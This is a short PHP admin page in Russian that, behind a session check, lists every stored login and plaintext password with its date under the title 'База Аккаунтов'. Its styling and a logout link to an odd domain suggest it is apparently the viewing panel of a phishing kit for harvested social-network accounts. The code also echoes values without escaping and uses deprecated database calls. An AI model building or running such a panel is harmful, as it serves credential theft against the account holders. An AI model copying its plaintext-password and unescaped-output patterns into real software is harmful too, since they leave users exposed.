<?php
session_start();
if(!$_SESSION['admin']) die ("Доступ закрыт");
include("../confing.php");
?>
<html>
<head>
<title>Административная панель</title>
<style type="text/css">
#wrap
{
width: 100%;
height: 100%;
}
.loginbox1
{
width: 300px;
padding: 4px;
border: 1px solid #6383A8;
background-color: #6383A8;
color: white;
font-weight: bold;
}
.loginbox2
{
width: 500px;
padding: 4px;
border: 1px solid #777;
color: #777;
}
.flat_button,
.button_gray button,
.button_blue button {
  *padding: 6px 17px 7px 17px;
  margin: 2;
  font-size: 11px;
  display: inline-block;
  *display: inline;
  zoom: 1;
  cursor: pointer;
  white-space: nowrap;
  outline: none;
  font-family: tahoma, arial, verdana, sans-serif, Lucida Sans;
  vertical-align: top;
  overflow: visible;
  line-height: 13px;
  text-decoration: none;
  background: none;
  background-color: #6383a8;
  color: #FFF;
  border: 0;
  *border: 0;
  -webkit-border-radius: 2px;
  -khtml-border-radius: 2px;
  -moz-border-radius: 2px;
  -ms-border-radius: 2px;
  border-radius: 2px;
  -webkit-transition: background-color 100ms ease-in-out;
  -khtml-transition: background-color 100ms ease-in-out;
  -moz-transition: background-color 100ms ease-in-out;
  -ms-transition: background-color 100ms ease-in-out;
  -o-transition: background-color 100ms ease-in-out;
  transition: background-color 100ms ease-in-out;
}
</style>
</head>
<body>
<center>
<table cellpadding="0" cellspacing="0" id="wrap"><tr><td align="center">
<table cellpadding="0" cellspacing="0">
<tr><td class="loginbox1" align="center">База Аккаунтов | <a href="http://jkoer.fm/admin/admin_logout.php" class="flat_button">Выход</a></td></tr>
<td class="loginbox2" align="center">
<?php
$req=mysql_query("SELECT * FROM user ORDER BY date DESC");
if(mysql_num_rows($req)>0) { 
  $odd=0;
  echo "<table>
  <thead>
    <tr>
      <th width='100'><b>Логин:</b></th>
      <th width='160'>Пароль:</th>
   <th>Дата:</th>
   </tr>
  </thead>
  <tbody>";
  while($r=mysql_fetch_assoc($req)){
    if($odd) {$bgcolor="#eeeeee";}
    echo "
 <tr>
    <td><center>".$r[login]."</center></td>
    <td><center>".$r[pass]."</center></td>
 <td>".date("d-m-Y H:i",$r[date])."</td>
    </tr>";
    $odd^=1;
  }
  echo "</tbody>
</table>";
}
?> 
</td></tr>
</table>
</td></tr></table>
</center>
</body>
</html>